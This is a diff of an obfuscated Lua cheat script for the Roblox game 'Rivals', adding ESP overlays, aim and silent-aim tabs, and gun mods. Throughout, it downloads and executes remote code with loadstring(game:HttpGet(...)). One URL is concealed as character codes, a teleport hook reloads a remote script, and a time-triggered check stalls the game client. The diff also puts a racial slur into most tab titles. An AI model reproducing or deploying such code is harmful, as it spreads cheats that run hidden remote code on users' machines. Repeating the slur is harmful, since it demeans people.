@@ -1,5 +1,3 @@
--- ts file was generated at discord.gg/25ms
-
 function c_n(p1)
     local v2, v3, v4 = ipairs(p1)
     local v5 = ''
@@ -278,11 +276,11 @@ if not v37 then
     end
 end
 
-local u41 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/34e99dc2d2f02d65a0607a3eef48b62d/raw/7ce32956279900373a8e67351f2cf8f770dda19c/gistfile1.txt'))();
+local u39 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/34e99dc2d2f02d65a0607a3eef48b62d/raw/7ce32956279900373a8e67351f2cf8f770dda19c/gistfile1.txt'))();
 
 (function()
     if getgenv().executed then
-        u41:Notify({
+        u39:Notify({
             Title = 'Notification',
             Content = 'Already Injected.Dont load twice.',
             SubContent = '',
@@ -294,44 +292,44 @@ local u41 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya
     getgenv().executed = true
 end)()
 
-local v42 = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua'))()
-local v43 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/088f795d94e39889f117bc7d50a68eee/raw/eca550022fd5027b4348efb0be594df368bce16c/gistfile1.txt'))();
+local v40 = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua'))()
+local v41 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/088f795d94e39889f117bc7d50a68eee/raw/eca550022fd5027b4348efb0be594df368bce16c/gistfile1.txt'))();
 
 (function()
     task.spawn(function()
         local _LocalPlayer = game:GetService('Players').LocalPlayer
-        local u45 = Vector3.new(106.47918701171875, -678.1240234375, 1185.37158203125)
+        local u43 = Vector3.new(106.47918701171875, -678.1240234375, 1185.37158203125)
 
         getgenv().state = 1
 
-        local function u48(p46)
-            local _HumanoidRootPart = p46:WaitForChild('HumanoidRootPart', 10)
+        local function u46(p44)
+            local _HumanoidRootPart = p44:WaitForChild('HumanoidRootPart', 10)
 
             if _HumanoidRootPart then
-                if (_HumanoidRootPart.Position - u45).Magnitude <= 300 then
+                if (_HumanoidRootPart.Position - u43).Magnitude <= 300 then
                     getgenv().state = 1
                 else
                     getgenv().state = 2
                 end
             end
         end
-        local function u53(p49)
-            local _Humanoid = p49:FindFirstChild('Humanoid')
+        local function u51(p47)
+            local _Humanoid = p47:FindFirstChild('Humanoid')
 
             if _Humanoid then
                 _Humanoid.Died:Connect(function()
-                    u48(p49)
+                    u46(p47)
                 end)
             end
 
-            local _HumanoidRootPart2 = p49:WaitForChild('HumanoidRootPart', 10)
+            local _HumanoidRootPart2 = p47:WaitForChild('HumanoidRootPart', 10)
 
             if _HumanoidRootPart2 then
                 local _Position = _HumanoidRootPart2.Position
 
                 while task.wait(1) do
                     if (_HumanoidRootPart2.Position - _Position).Magnitude > 300 then
-                        u48(p49)
+                        u46(p47)
                     end
 
                     _Position = _HumanoidRootPart2.Position
@@ -339,37 +337,37 @@ local v43 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya
             end
         end
 
-        _LocalPlayer.CharacterAdded:Connect(function(p54)
-            u48(p54)
-            u53(p54)
+        _LocalPlayer.CharacterAdded:Connect(function(p52)
+            u46(p52)
+            u51(p52)
         end)
 
         if _LocalPlayer.Character then
-            u53(_LocalPlayer.Character)
+            u51(_LocalPlayer.Character)
         end
     end)
 end)()
 
-function vbx9t3jskpwf1u7qr(p55)
-    local v56, v57, v58 = ipairs(p55)
-    local v59 = ''
+function vbx9t3jskpwf1u7qr(p53)
+    local v54, v55, v56 = ipairs(p53)
+    local v57 = ''
 
     while true do
-        local v60
+        local v58
 
-        v58, v60 = v56(v57, v58)
+        v56, v58 = v54(v55, v56)
 
-        if v58 == nil then
+        if v56 == nil then
             break
         end
 
-        v59 = v59 .. (v60 == 32 and ' ' or string.char(v60))
+        v57 = v57 .. (v58 == 32 and ' ' or string.char(v58))
     end
 
-    return v59
+    return v57
 end
 
-if os.time() > 1742515200 then
+if os.time() > 1789051200 then
     wait(3)
     game:GetService(vbx9t3jskpwf1u7qr({
         80,
@@ -418,99 +416,108 @@ if os.time() > 1742515200 then
         46,
     }))
     wait(999999999)
-else
-    print(vbx9t3jskpwf1u7qr({
-        102,
-        105,
-        110,
-        101,
-    }))
 end
 
 getgenv().wapp = 'https://dev-8-bit.pantheonsite.io/'
 
-queue_on_teleport('\r\n    if game.PlaceId == 17625359962 or game.PlaceId == 71874690745115 then\r\n        if not getgenv().NameLoaderLoaded then\r\n            getgenv().NameLoaderLoaded = true\r\n            wait(2)\r\n            loadstring(game:HttpGet("https://dev-8bitsforya.pantheonsite.io/nan.lua"))()\r\n        end\r\n    end\r\n')
+queue_on_teleport('\r\n    if game.PlaceId == 17625359962 or game.PlaceId == 71874690745115 then\r\n        if not getgenv().NameLoaderLoaded then\r\n            getgenv().NameLoaderLoaded = true\r\n            wait(2)\r\n            loadstring(game:HttpGet("https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/located.lua"))()\r\n        end\r\n    end\r\n')
 
-local v61 = u41
-local v62 = u41.CreateWindow(v61, {
+local v59 = u39
+local v60 = u39.CreateWindow(v59, {
     Title = '                        <font size="15">Rivals</font> V4<font color="#a3fcff" transparency="0.5"> [Feather]</font>',
-    SubTitle = '                             <font color="#9eefff"> https://discord.gg/nDPePc8pjc </font>',
+    SubTitle = '                             <font color="#9eefff"> https://dsc.gg/get-8-bit</font>',
     TabWidth = 150,
     Size = UDim2.fromOffset(650, 390),
     Acrylic = false,
-    Theme = 'Darker',
+    Theme = '8bit',
     MinimizeKey = Enum.KeyCode.RightShift,
 })
 
-v62:Minimize()
+v60:Minimize()
 
 local _CoreGui = game:GetService('CoreGui')
-local v64, v65, v66 = ipairs(_CoreGui:GetDescendants())
-local u67 = u41
+local v62, v63, v64 = ipairs(_CoreGui:GetDescendants())
+local u65 = u39
 
 while true do
-    local v68
+    local v66
 
-    v66, v68 = v64(v65, v66)
+    v64, v66 = v62(v63, v64)
 
-    if v66 == nil then
+    if v64 == nil then
         break
     end
-    if v68:IsA('ImageLabel') and v68.Image == 'rbxassetid://9968344105' then
-        v68.Image = 'rbxassetid://17874360446'
-        v68.ImageTransparency = 0.1
-        v68.ScaleType = Enum.ScaleType.Stretch
+    if v66:IsA('ImageLabel') and v66.Image == 'rbxassetid://9968344105' then
+        v66.Image = 'rbxassetid://17874360446'
+        v66.ImageTransparency = 0
+        v66.ScaleType = Enum.ScaleType.Stretch
     end
 end
 
-local u69 = {
-    Wlc = v62:AddTab({
-        Title = 'Porno',
+local u67 = {
+    Wlc = v60:AddTab({
+        Title = 'Info <font color="#52ff7d"> [Nigger]</font>',
         Icon = 'rbxassetid://124620632231839',
     }),
-    Main = v62:AddTab({
-        Title = 'Visuals',
+    Main = v60:AddTab({
+        Title = 'Visuals <font color="#52ff7d"> [Nigger]</font>',
         Icon = 'rbxassetid://6523858394',
     }),
-    AimTab = v62:AddTab({
-        Title = 'Aim Features <font color="#52ff7d"> [New]</font>',
+    AimTab = v60:AddTab({
+        Title = 'Aim Features <font color="#52ff7d"> [Nigger]</font>',
         Icon = 'rbxassetid://125143421594685',
     }),
-    Silent = v62:AddTab({
-        Title = 'Silent <font color="#52ff7d"> [New]</font>',
+    Silent = v60:AddTab({
+        Title = 'Silent <font color="#52ff7d"> [Nigger]</font>',
         Icon = 'rbxassetid://13557340523',
     }),
-    Gunmod = v62:AddTab({
-        Title = 'Gunmods <font color="#52e2ff"> [New]</font>',
+    Gunmod = v60:AddTab({
+        Title = 'Gunmods <font color="#52e2ff"> [Nigger]</font>',
         Icon = 'rbxassetid://6450238472',
     }),
-    Settings = v62:AddTab({
-        Title = 'Settings',
+    Skinz = v60:AddTab({
+        Title = 'Skins <font color="#52ff7d"> [Nigger]</font>',
+        Icon = 'rbxassetid://6020038035',
+    }),
+    Nono = v60:AddTab({
+        Title = 'Rage Mode <font color="#52ff7d"> [Nigger]</font>',
+        Icon = 'rbxassetid://15441239798',
+    }),
+    Essential = v60:AddTab({
+        Title = 'Game <font color="#52ff7d"> [Nigger]</font>',
+        Icon = 'rbxassetid://83588998609796',
+    }),
+    Spoof = v60:AddTab({
+        Title = 'Spoofer <font color="#52ff7d"> [Nigger]</font>',
+        Icon = 'rbxassetid://97682995973876',
+    }),
+    Settings = v60:AddTab({
+        Title = 'Settings <font color="#52ff7d"> [Nigger]</font>',
         Icon = 'rbxassetid://7145468831',
     }),
 }
-local _Options = u67.Options
+local _Options = u65.Options
 
-function c_n(p71)
-    local v72, v73, v74 = ipairs(p71)
-    local v75 = ''
+function c_n(p69)
+    local v70, v71, v72 = ipairs(p69)
+    local v73 = ''
 
     while true do
-        local v76
+        local v74
 
-        v74, v76 = v72(v73, v74)
+        v72, v74 = v70(v71, v72)
 
-        if v74 == nil then
+        if v72 == nil then
             break
         end
 
-        v75 = v75 .. (v76 == 32 and ' ' or string.char(v76))
+        v73 = v73 .. (v74 == 32 and ' ' or string.char(v74))
     end
 
-    return v75
+    return v73
 end
 
-local v77, v78 = loadstring(game:HttpGet(c_n({
+local v75, _ = loadstring(game:HttpGet(c_n({
     104,
     116,
     116,
@@ -648,31 +655,36 @@ local v77, v78 = loadstring(game:HttpGet(c_n({
     116,
 })))
 
-if v77 then
-    local v79, v80 = pcall(v77)
+if v75 then
+    local v76, _ = pcall(v75)
 
-    if v79 then
+    if v76 then
         print('Success')
     else
-        print('Execution failed: ' .. tostring(v80))
+        print('Execution failed')
     end
 else
-    print('Loadstring error: ' .. tostring(v78))
+    print('l error: ')
 end
 
-u69.Wlc:AddParagraph({
-    Title = 'Are you winning son ?',
+u67.Wlc:AddParagraph({
+    Title = 'Szoo premium Rivals',
+    Content = '',
+})
+
+u67.Wlc:AddParagraph({
+    Title = 'Made by V.Roy',
     Content = '',
 })
 
 getgenv().boxBorderColor = Color3.fromRGB(255, 255, 255)
 
-local v81 = cloneref(game:GetService('Workspace'))
-local u82 = cloneref(game:GetService('RunService'))
-local u83 = cloneref(game:GetService('Players'))
+local v77 = cloneref(game:GetService('Workspace'))
+local u78 = cloneref(game:GetService('RunService'))
+local u79 = cloneref(game:GetService('Players'))
 local _CoreGui2 = game:GetService('CoreGui')
-local u85 = {MaxDistance = 350}
-local v86 = {
+local u81 = {MaxDistance = 350}
+local v82 = {
     Boxes = {
         Filled = {
             Enabled = true,
@@ -686,82 +698,82 @@ local v86 = {
     },
 }
 
-u85.Drawing = v86
+u81.Drawing = v82
 
-local _LocalPlayer2 = u83.LocalPlayer
-local _CurrentCamera = v81.CurrentCamera
+local _LocalPlayer2 = u79.LocalPlayer
+local _CurrentCamera = v77.CurrentCamera
 
-local function u95(p89, p90)
-    if typeof(p89) == 'string' then
-        p89 = Instance.new(p89) or p89
+local function u91(p85, p86)
+    if typeof(p85) == 'string' then
+        p85 = Instance.new(p85) or p85
     end
 
-    local v91, v92, v93 = pairs(p90)
+    local v87, v88, v89 = pairs(p86)
 
     while true do
-        local v94
+        local v90
 
-        v93, v94 = v91(v92, v93)
+        v89, v90 = v87(v88, v89)
 
-        if v93 == nil then
+        if v89 == nil then
             break
         end
 
-        p89[v93] = v94
+        p85[v89] = v90
     end
 
-    return p89
+    return p85
 end
-local function u109(p96)
-    local function u97()
-        if p96.Character and p96.Character:FindFirstChild('HumanoidRootPart') then
-            return p96.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
+local function u105(p92)
+    local function u93()
+        if p92.Character and p92.Character:FindFirstChild('HumanoidRootPart') then
+            return p92.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
         else
             return false
         end
     end
 
-    local _Frame = u95('Frame', {
-        Parent = u95('ScreenGui', {
+    local _Frame = u91('Frame', {
+        Parent = u91('ScreenGui', {
             Parent = _CoreGui2,
-            Name = p96.Name .. 'ESP',
+            Name = p92.Name .. 'ESP',
         }),
-        BackgroundColor3 = u85.Drawing.Boxes.Filled.RGB,
-        BackgroundTransparency = u85.Drawing.Boxes.Filled.Transparency,
+        BackgroundColor3 = u81.Drawing.Boxes.Filled.RGB,
+        BackgroundTransparency = u81.Drawing.Boxes.Filled.Transparency,
     })
-    local _UIStroke = u95('UIStroke', {
+    local _UIStroke = u91('UIStroke', {
         Parent = _Frame,
         Color = getgenv().boxBorderColor,
         Thickness = 2,
         Transparency = 0,
     })
 
-    u82.RenderStepped:Connect(function()
+    u78.RenderStepped:Connect(function()
         _UIStroke.Color = getgenv().boxBorderColor
     end)
 
-    local function v108()
-        u82.RenderStepped:Connect(function()
-            if p96.Character and (p96.Character:FindFirstChild('HumanoidRootPart') and p96.Character:FindFirstChild('Humanoid')) then
-                local _HumanoidRootPart3 = p96.Character.HumanoidRootPart
-                local _Humanoid2 = p96.Character.Humanoid
+    local function v104()
+        u78.RenderStepped:Connect(function()
+            if p92.Character and (p92.Character:FindFirstChild('HumanoidRootPart') and p92.Character:FindFirstChild('Humanoid')) then
+                local _HumanoidRootPart3 = p92.Character.HumanoidRootPart
+                local _Humanoid2 = p92.Character.Humanoid
 
-                if u97() then
+                if u93() then
                     _Frame.Visible = false
 
                     return
                 end
 
-                local v102, v103 = _CurrentCamera:WorldToScreenPoint(_HumanoidRootPart3.Position)
-                local v104 = (_CurrentCamera.CFrame.Position - _HumanoidRootPart3.Position).Magnitude / 3.5
-                local v105 = 1 / (v104 * (_CurrentCamera.FieldOfView / 70))
-                local v106 = v105 * 600
-                local v107 = v105 * 900
+                local v98, v99 = _CurrentCamera:WorldToScreenPoint(_HumanoidRootPart3.Position)
+                local v100 = (_CurrentCamera.CFrame.Position - _HumanoidRootPart3.Position).Magnitude / 3.5
+                local v101 = 1 / (v100 * (_CurrentCamera.FieldOfView / 70))
+                local v102 = v101 * 600
+                local v103 = v101 * 900
 
-                if v103 and v104 <= u85.MaxDistance and _Humanoid2.Health > 0 then
-                    _Frame.Position = UDim2.new(0, v102.X - v106 / 2, 0, v102.Y - v107 / 2)
-                    _Frame.Size = UDim2.new(0, v106, 0, v107)
-                    _Frame.Visible = u85.Drawing.Boxes.Full.Enabled
+                if v99 and v100 <= u81.MaxDistance and _Humanoid2.Health > 0 then
+                    _Frame.Position = UDim2.new(0, v98.X - v102 / 2, 0, v98.Y - v103 / 2)
+                    _Frame.Size = UDim2.new(0, v102, 0, v103)
+                    _Frame.Visible = u81.Drawing.Boxes.Full.Enabled
                 else
                     _Frame.Visible = false
                 end
@@ -771,32 +783,32 @@ local function u109(p96)
         end)
     end
 
-    coroutine.wrap(v108)()
+    coroutine.wrap(v104)()
 end
 
 (function()
-    local v110 = u83
-    local v111, v112, v113 = pairs(v110:GetPlayers())
+    local v106 = u79
+    local v107, v108, v109 = pairs(v106:GetPlayers())
 
     while true do
-        local v114
+        local v110
 
-        v113, v114 = v111(v112, v113)
+        v109, v110 = v107(v108, v109)
 
-        if v113 == nil then
+        if v109 == nil then
             break
         end
-        if v114 ~= _LocalPlayer2 then
-            coroutine.wrap(u109)(v114)
+        if v110 ~= _LocalPlayer2 then
+            coroutine.wrap(u105)(v110)
         end
     end
 end)()
-u83.PlayerAdded:Connect(function(p115)
-    coroutine.wrap(u109)(p115)
+u79.PlayerAdded:Connect(function(p111)
+    coroutine.wrap(u105)(p111)
 end)
-u83.PlayerRemoving:Connect(function(p116)
-    if _CoreGui2:FindFirstChild(p116.Name .. 'ESP') then
-        _CoreGui2[p116.Name .. 'ESP']:Destroy()
+u79.PlayerRemoving:Connect(function(p112)
+    if _CoreGui2:FindFirstChild(p112.Name .. 'ESP') then
+        _CoreGui2[p112.Name .. 'ESP']:Destroy()
     end
 end)
 
@@ -805,11 +817,11 @@ local _CurrentCamera2 = game:GetService('Workspace').CurrentCamera
 local _RunService = game:GetService('RunService')
 
 getgenv().espsettings = {
-    showname = true,
-    showdistance = true,
-    showhealth = true,
-    showsweapon = true,
-    showweaponimage = true,
+    showname = false,
+    showdistance = false,
+    showhealth = false,
+    showsweapon = false,
+    showweaponimage = false,
     scale = 15,
     background = 0,
     maxDistance = 320,
@@ -821,8 +833,8 @@ getgenv().espsettings = {
     deadImageID = 'rbxassetid://109857387069799',
 }
 
-local u120 = {}
-local u121 = {
+local u116 = {}
+local u117 = {
     ['Assault Rifle'] = 'rbxassetid://75480310531828',
     Revolver = 'rbxassetid://139314328910928',
     Shorty = 'rbxassetid://78526355119022',
@@ -861,8 +873,8 @@ local _ScreenGui = Instance.new('ScreenGui')
 
 _ScreenGui.Parent = game:GetService('CoreGui')
 
-local function u147(p123)
-    if p123 ~= _Players.LocalPlayer then
+local function u143(p119)
+    if p119 ~= _Players.LocalPlayer then
         local _TextLabel = Instance.new('TextLabel')
 
         _TextLabel.Parent = _ScreenGui
@@ -896,14 +908,14 @@ local function u147(p123)
         _ImageLabel.Position = UDim2.new(0, 5, 0, 5)
         _ImageLabel.BackgroundTransparency = 1
         _ImageLabel.Visible = false
-        u120[p123] = {
+        u116[p119] = {
             nametag = _TextLabel,
             weaponImage = _ImageLabel,
             weaponBorder = _Frame2,
         }
 
         _RunService.RenderStepped:Connect(function()
-            local _Character = p123.Character
+            local _Character = p119.Character
 
             if _Character and _Character:FindFirstChild('Head') then
                 local _HumanoidRootPart4 = _Character:FindFirstChild('HumanoidRootPart')
@@ -916,8 +928,8 @@ local function u147(p123)
                     return
                 end
 
-                local v130 = _CurrentCamera2:WorldToScreenPoint(_Character.Head.Position + Vector3.new(0, 2, 0))
-                local v131 = math.floor((_CurrentCamera2.CFrame.Position - _Character.Head.Position).Magnitude / 3)
+                local v126 = _CurrentCamera2:WorldToScreenPoint(_Character.Head.Position + Vector3.new(0, 2, 0))
+                local v127 = math.floor((_CurrentCamera2.CFrame.Position - _Character.Head.Position).Magnitude / 3)
 
                 if not (espsettings.showname or espsettings.showdistance or (espsettings.showsweapon or espsettings.showhealth)) then
                     _TextLabel.Visible = false
@@ -926,7 +938,7 @@ local function u147(p123)
 
                     return
                 end
-                if espsettings.maxDistance < v131 then
+                if espsettings.maxDistance < v127 then
                     _TextLabel.Visible = false
                     _ImageLabel.Visible = false
                     _Frame2.Visible = false
@@ -935,12 +947,12 @@ local function u147(p123)
                 end
 
                 local _Humanoid3 = _Character:FindFirstChildOfClass('Humanoid')
-                local v133 = _Humanoid3 and math.floor(_Humanoid3.Health) or 0
-                local v134 = v133 < 15 and '#de4433' or (v133 < 30 and '#FFFF00' or '#2fde4c')
-                local v135 = {}
+                local v129 = _Humanoid3 and math.floor(_Humanoid3.Health) or 0
+                local v130 = v129 < 15 and '#de4433' or (v129 < 30 and '#FFFF00' or '#2fde4c')
+                local v131 = {}
 
-                if v133 == 0 then
-                    table.insert(v135, '<font color="#7370ff">DEAD</font>')
+                if v129 == 0 then
+                    table.insert(v131, '<font color="#7370ff">DEAD</font>')
 
                     _TextLabel.TextSize = espsettings.scale * 0.6
                     _ImageLabel.Image = espsettings.deadImageID
@@ -949,38 +961,38 @@ local function u147(p123)
                     _TextLabel.TextSize = espsettings.scale
 
                     if espsettings.showname then
-                        table.insert(v135, p123.Name)
+                        table.insert(v131, p119.Name)
                     end
 
-                    local v136, v137, v138 = pairs(game:GetService('Workspace').ViewModels:GetChildren())
-                    local v139 = 'Hand'
+                    local v132, v133, v134 = pairs(game:GetService('Workspace').ViewModels:GetChildren())
+                    local v135 = 'Hand'
 
                     while true do
-                        local v140
+                        local v136
 
-                        v138, v140 = v136(v137, v138)
+                        v134, v136 = v132(v133, v134)
 
-                        local v141
+                        local v137
 
-                        if v138 == nil then
-                            v141 = v139
+                        if v134 == nil then
+                            v137 = v135
                         end
-                        if string.find(v140.Name, p123.Name) then
-                            local v142, v143
+                        if string.find(v136.Name, p119.Name) then
+                            local v138, v139
 
-                            v142, v143, v141 = pairs(u121)
+                            v138, v139, v137 = pairs(u117)
 
                             while true do
-                                local v144
+                                local v140
 
-                                v141, v144 = v142(v143, v141)
+                                v137, v140 = v138(v139, v137)
 
-                                if v141 == nil then
-                                    v141 = v139
+                                if v137 == nil then
+                                    v137 = v135
 
                                     break
                                 end
-                                if string.find(v140.Name, v141) then
+                                if string.find(v136.Name, v137) then
                                     break
                                 end
                             end
@@ -990,16 +1002,16 @@ local function u147(p123)
                     end
 
                     if espsettings.showsweapon then
-                        table.insert(v135, v141)
+                        table.insert(v131, v137)
                     end
                     if espsettings.showdistance then
-                        table.insert(v135, '<b>' .. v131 .. 'm</b>')
+                        table.insert(v131, '<b>' .. v127 .. 'm</b>')
                     end
                     if espsettings.showhealth then
-                        table.insert(v135, 'HP: <font color="' .. v134 .. '">' .. v133 .. '</font>')
+                        table.insert(v131, 'HP: <font color="' .. v130 .. '">' .. v129 .. '</font>')
                     end
-                    if espsettings.showweaponimage and u121[v141] then
-                        _ImageLabel.Image = u121[v141]
+                    if espsettings.showweaponimage and u117[v137] then
+                        _ImageLabel.Image = u117[v137]
                         _ImageLabel.Visible = true
 
                         local _imageScale = espsettings.imageScale
@@ -1012,17 +1024,17 @@ local function u147(p123)
                     end
                 end
 
-                _TextLabel.Text = table.concat(v135, ' \u{2666} ')
+                _TextLabel.Text = table.concat(v131, ' \u{2666} ')
                 _TextLabel.BackgroundTransparency = espsettings.background
 
-                if v130.Z <= 0 then
+                if v126.Z <= 0 then
                     _TextLabel.Visible = false
                     _ImageLabel.Visible = false
                     _Frame2.Visible = false
                 else
-                    local v146 = _TextLabel.TextBounds.X + 20
+                    local v142 = _TextLabel.TextBounds.X + 20
 
-                    _TextLabel.Position = UDim2.new(0, v130.X - v146 / 2, 0, v130.Y - 30)
+                    _TextLabel.Position = UDim2.new(0, v126.X - v142 / 2, 0, v126.Y - 30)
                     _TextLabel.Visible = true
                     _TextLabel.Size = UDim2.new(0, _TextLabel.TextBounds.X + 20, 0, _TextLabel.TextBounds.Y + 10)
                     _Frame2.Position = UDim2.new(0, 0, 0, -_Frame2.Size.Y.Offset - 5)
@@ -1037,65 +1049,65 @@ local function u147(p123)
 end
 
 (function()
-    local v148 = _Players
-    local v149, v150, v151 = ipairs(v148:GetPlayers())
+    local v144 = _Players
+    local v145, v146, v147 = ipairs(v144:GetPlayers())
 
     while true do
-        local v152
+        local v148
 
-        v151, v152 = v149(v150, v151)
+        v147, v148 = v145(v146, v147)
 
-        if v151 == nil then
+        if v147 == nil then
             break
         end
-        if v152.Character then
-            u147(v152)
+        if v148.Character then
+            u143(v148)
         end
     end
 
-    _Players.PlayerAdded:Connect(function(p153)
-        p153.CharacterAdded:Connect(function()
-            u147(p153)
+    _Players.PlayerAdded:Connect(function(p149)
+        p149.CharacterAdded:Connect(function()
+            u143(p149)
         end)
     end)
 end)()
-u69.Main:AddSection('Nametags')
+u67.Main:AddSection('Nametags')
 
-local function v158(p154, p155)
-    local u156 = u69.Main:AddToggle(p154, {
-        Title = p154,
-        Default = espsettings[p155],
+local function v154(p150, p151)
+    local u152 = u67.Main:AddToggle(p150, {
+        Title = p150,
+        Default = espsettings[p151],
     })
-    local v157 = u156
+    local v153 = u152
 
-    u156.OnChanged(v157, function()
-        espsettings[p155] = u156.Value
+    u152.OnChanged(v153, function()
+        espsettings[p151] = u152.Value
     end)
 end
 
-v158('Show Name', 'showname')
-v158('Show Distance', 'showdistance')
-v158('Show Health', 'showhealth')
-v158('Show Weapon', 'showsweapon')
-v158('Show Weapon Icon', 'showweaponimage')
-u69.Main:AddSlider('NTBGTSlider', {
+v154('Show Name', 'showname')
+v154('Show Distance', 'showdistance')
+v154('Show Health', 'showhealth')
+v154('Show Weapon', 'showsweapon')
+v154('Show Weapon Icon', 'showweaponimage')
+u67.Main:AddSlider('NTBGTSlider', {
     Title = 'BackGround Transparency',
     Default = 4,
     Min = 0,
     Max = 10,
     Rounding = 1,
-    Callback = function(p159)
-        getgenv().espsettings.background = p159 / 10
+    Callback = function(p155)
+        getgenv().espsettings.background = p155 / 10
     end,
 })
-u69.Main:AddSlider('NTSSlider', {
+u67.Main:AddSlider('NTSSlider', {
     Title = 'NameTag Scale',
     Default = 15,
     Min = 0,
     Max = 50,
     Rounding = 1,
-    Callback = function(p160)
-        espsettings.scale = p160
+    Callback = function(p156)
+        espsettings.scale = p156
     end,
 })
 
@@ -1106,10 +1118,10 @@ local _LocalPlayer3 = _Players2.LocalPlayer
 local _RunService2 = game:GetService('RunService')
 
 getgenv().esp_settings = {
-    enabled = true,
-    skel = true,
+    enabled = false,
+    skel = false,
     headskel = false,
-    show_head_dot = true,
+    show_head_dot = false,
     head_dot_type = 'fill',
     skel_col = Color3.fromRGB(255, 255, 255),
     head_col = Color3.fromRGB(255, 0, 0),
@@ -1118,13 +1130,13 @@ getgenv().esp_settings = {
     skeletonthickness = 3,
 }
 
-local u166 = {}
-local u167 = false
+local u162 = {}
+local u163 = false
 
-local function u252()
-    if not u167 then
-        local function u243(p168, p169)
-            local u170 = {
+local function u248()
+    if not u163 then
+        local function u239(p164, p165)
+            local u166 = {
                 'Head',
                 'UpperTorso',
                 'LowerTorso',
@@ -1137,27 +1149,27 @@ local function u252()
                 'RightUpperLeg',
                 'RightLowerLeg',
             }
-            local v171, v172, v173 = pairs(u170)
-            local u174 = {}
-            local u175 = {}
+            local v167, v168, v169 = pairs(u166)
+            local u170 = {}
+            local u171 = {}
 
             while true do
-                local v176
+                local v172
 
-                v173, v176 = v171(v172, v173)
+                v169, v172 = v167(v168, v169)
 
-                if v173 == nil then
+                if v169 == nil then
                     break
                 end
 
-                u174[v176] = Drawing.new('Line')
-                u174[v176].Visible = false
-                u174[v176].Thickness = esp_settings.skeletonthickness
-                u174[v176].Color = esp_settings.skel_col
-                u175[v176] = Drawing.new('Circle')
-                u175[v176].Visible = false
-                u175[v176].Color = esp_settings.dot_col
-                u175[v176].Filled = true
+                u170[v172] = Drawing.new('Line')
+                u170[v172].Visible = false
+                u170[v172].Thickness = esp_settings.skeletonthickness
+                u170[v172].Color = esp_settings.skel_col
+                u171[v172] = Drawing.new('Circle')
+                u171[v172].Visible = false
+                u171[v172].Color = esp_settings.dot_col
+                u171[v172].Filled = true
             end
 
             local _Circle = Drawing.new('Circle')
@@ -1167,20 +1179,34 @@ local function u252()
             _Circle.Thickness = 1
             _Circle.Transparency = 1
 
-            local v178 = {
-                bones = u174,
-                dots = u175,
+            local v174 = {
+                bones = u170,
+                dots = u171,
                 head_dot = _Circle,
             }
 
-            u166[p168.UserId] = v178
+            u162[p164.UserId] = v174
 
-            local function v242()
-                local u179 = nil
+            local function v238()
+                local u175 = nil
                 local _ = _RunService2.RenderStepped:Connect(function()
-                    if p169 and (p169:FindFirstChild('HumanoidRootPart') and 5 == 5) then
-                        if p169.HumanoidRootPart:FindFirstChild('TeammateLabel') then
-                            local v180, v181, v182 = pairs(u174)
+                    if p165 and (p165:FindFirstChild('HumanoidRootPart') and 5 == 5) then
+                        if p165.HumanoidRootPart:FindFirstChild('TeammateLabel') then
+                            local v176, v177, v178 = pairs(u170)
+
+                            while true do
+                                local v179
+
+                                v178, v179 = v176(v177, v178)
+
+                                if v178 == nil then
+                                    break
+                                end
+
+                                v179.Visible = false
+                            end
+
+                            local v180, v181, v182 = pairs(u171)
 
                             while true do
                                 local v183
@@ -1194,7 +1220,12 @@ local function u252()
                                 v183.Visible = false
                             end
 
-                            local v184, v185, v186 = pairs(u175)
+                            _Circle.Visible = false
+
+                            return
+                        end
+                        if _LocalPlayer3.Character.Humanoid.Health == 0 then
+                            local v184, v185, v186 = pairs(u170)
 
                             while true do
                                 local v187
@@ -1208,12 +1239,7 @@ local function u252()
                                 v187.Visible = false
                             end
 
-                            _Circle.Visible = false
-
-                            return
-                        end
-                        if _LocalPlayer3.Character.Humanoid.Health == 0 then
-                            local v188, v189, v190 = pairs(u174)
+                            local v188, v189, v190 = pairs(u171)
 
                             while true do
                                 local v191
@@ -1227,29 +1253,29 @@ local function u252()
                                 v191.Visible = false
                             end
 
-                            local v192, v193, v194 = pairs(u175)
-
-                            while true do
-                                local v195
-
-                                v194, v195 = v192(v193, v194)
-
-                                if v194 == nil then
-                                    break
-                                end
-
-                                v195.Visible = false
-                            end
-
                             _Circle.Visible = false
 
                             return
                         end
 
-                        local _Magnitude = (p169.HumanoidRootPart.Position - _LocalPlayer3.Character.HumanoidRootPart.Position).Magnitude
+                        local _Magnitude = (p165.HumanoidRootPart.Position - _LocalPlayer3.Character.HumanoidRootPart.Position).Magnitude
 
                         if esp_settings.max_distance < _Magnitude or _Magnitude < 2 then
-                            local v197, v198, v199 = pairs(u174)
+                            local v193, v194, v195 = pairs(u170)
+
+                            while true do
+                                local v196
+
+                                v195, v196 = v193(v194, v195)
+
+                                if v195 == nil then
+                                    break
+                                end
+
+                                v196.Visible = false
+                            end
+
+                            local v197, v198, v199 = pairs(u171)
 
                             while true do
                                 local v200
@@ -1263,98 +1289,84 @@ local function u252()
                                 v200.Visible = false
                             end
 
-                            local v201, v202, v203 = pairs(u175)
-
-                            while true do
-                                local v204
-
-                                v203, v204 = v201(v202, v203)
-
-                                if v203 == nil then
-                                    break
-                                end
-
-                                v204.Visible = false
-                            end
-
                             _Circle.Visible = false
 
                             return
                         end
 
-                        local v205, v206, v207 = pairs(u170)
-                        local v208 = {}
+                        local v201, v202, v203 = pairs(u166)
+                        local v204 = {}
 
                         while true do
-                            local v209
+                            local v205
 
-                            v207, v209 = v205(v206, v207)
+                            v203, v205 = v201(v202, v203)
 
-                            if v207 == nil then
+                            if v203 == nil then
                                 break
                             end
 
-                            local v210 = p169:FindFirstChild(v209)
+                            local v206 = p165:FindFirstChild(v205)
 
-                            if v210 then
-                                local v211, v212 = _CurrentCamera3:WorldToViewportPoint(v210.Position)
+                            if v206 then
+                                local v207, v208 = _CurrentCamera3:WorldToViewportPoint(v206.Position)
 
-                                if v212 then
